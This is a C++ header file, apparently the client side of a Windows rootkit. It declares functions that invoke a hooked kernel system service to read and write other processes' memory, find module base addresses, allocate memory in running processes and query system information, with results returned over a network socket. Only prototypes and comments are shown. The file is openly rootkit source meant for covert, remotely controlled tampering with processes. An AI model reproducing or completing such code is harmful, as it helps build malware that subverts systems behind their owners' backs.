#pragma once
#include "internet.h"

template<typename ... Arg>
uint64_t CallHook(const Arg ... args);  // Actual function that calls the DLL function of the hooked system service

BOOL CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack);  // Calls CallHook and handles sending the results back to the client if needed
BOOL WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr);  // Write into process virtual memory (from US buffer/another process VM)
BOOL ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName);  // Read from a process virtual memory
BOOL MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName);  // Get the base address of a running process in memory
BOOL DbgStrKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Message);  // Display a debug string with DbgPrintEx()
BOOL SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize);  // Get specific system information with ZwQuerySystemInformation()
BOOL AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName);  // Allocate specific memory region in memory of a certain running process (and keep it running)